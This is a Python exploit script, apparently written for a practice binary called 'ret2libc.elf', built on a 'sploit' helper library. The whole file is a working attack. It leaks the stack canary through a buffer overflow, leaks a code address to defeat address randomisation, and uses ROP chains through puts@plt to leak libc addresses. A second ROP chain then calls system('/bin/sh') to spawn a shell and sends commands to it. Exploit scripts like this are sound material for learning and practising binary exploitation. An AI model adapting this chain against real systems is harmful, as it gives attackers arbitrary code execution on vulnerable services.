from sploit.until import lastline, contains, equals
from sploit.arch import btoi, arch
from sploit.mem import Symtbl
from sploit.payload import Payload
from sploit.rev.elf import ELF

elf = ELF('ret2libc.elf')
elf.sym.leak = elf.retaddr(elf.sym.main,elf.sym.vuln)[0]
elf.sym.ret = elf.retgad()
elf.sym.pop_rdi = elf.egad('pop rdi;ret')

stack = elf.locals.vuln
stack.ret = arch.wordsize
stack.rebase(stack.buf)

libc = elf.libs['libc.so.6']

#https://libc.rip/
#puts - 0x450
#read - 0xff0
#libc = Symtbl(
#    puts=0x84450,
#    read=0x10dff0,
#    exit=0x46a70,
#    system=0x522c0,
#    binsh=0x1b45bd
#)

def menu(choice):
    io.readlineuntil(lastline,contains,b'Choice')
    io.writeline(choice)

def leakcanary():
    p = Payload().bin(b'GREP').pad_front(stack.canary+1)

    menu(b'1')
    io.readlineuntil(lastline,contains,b'Enter')
    io.write(p())
    io.readuntil(equals, b'.*GREP')
    canary = b'\x00' + io.read(arch.wordsize-1)
    canary = btoi(canary)
    print("Leaked Canary: "+hex(canary))
    return canary

canary = leakcanary()

p = Payload().bin(b'GREP').pad_front(stack.ret)

menu(b'1')
io.readlineuntil(lastline,contains,b'Enter')
io.write(p())
io.readuntil(equals, b'.*GREP')
addr = io.readline()[:-1]
addr = btoi(addr)
print("Leaked Address: "+hex(addr))
elf.sym = elf.sym.map(addr,elf.sym.leak)

p = Payload().pad(stack.canary).int(canary).sbp()

p.ret(elf.sym.pop_rdi)
p.int(elf.sym._GOT_puts)
p.ret(elf.sym._PLT_puts)

p.ret(elf.sym.pop_rdi)
p.int(elf.sym._GOT_read)
p.ret(elf.sym._PLT_puts)

p.ret(elf.sym._start)

menu(b'1')
io.readlineuntil(lastline,contains,b'Enter')
print("Injecting ROP")
print("Calling puts@plt(puts@got) with addresses: "+hex(elf.sym._PLT_puts)+" "+hex(elf.sym._GOT_puts))
print("Calling puts@plt(read@got) with addresses: "+hex(elf.sym._PLT_puts)+" "+hex(elf.sym._GOT_read))
print("Calling start() with address: "+hex(elf.sym._start))
io.write(p())

menu(b'2')
addr = io.readline()[:-1]
addr = btoi(addr)
print("Leaked libc puts() Address: "+hex(addr))
libc.sym = libc.sym.map(addr,libc.sym.puts)
addr = io.readline()[:-1]
addr = btoi(addr)
print("Leaked libc read() Address: "+hex(addr))

canary = leakcanary()

p = Payload().pad(stack.canary).int(canary).sbp()

#align
p.ret(elf.sym.ret)

p.ret(elf.sym.pop_rdi)
p.int(libc.sym._bin_sh)
p.ret(libc.sym.system)

p.ret(elf.sym.pop_rdi)
p.int(0)
p.ret(libc.sym.exit)

menu(b'1')
io.readlineuntil(lastline,contains,b'Enter')
print("Injecting ROP")
print("Calling system(\"/bin/sh\") with addresses: "+hex(libc.sym.system)+" "+hex(libc.sym._bin_sh))
print("Calling exit(0) with address: "+hex(libc.sym.exit))
io.write(p())

menu(b'2')

import time
time.sleep(0.1)

#io.interact()
io.writeline(b"echo \"Win!\"")
io.writeline(b"exit")
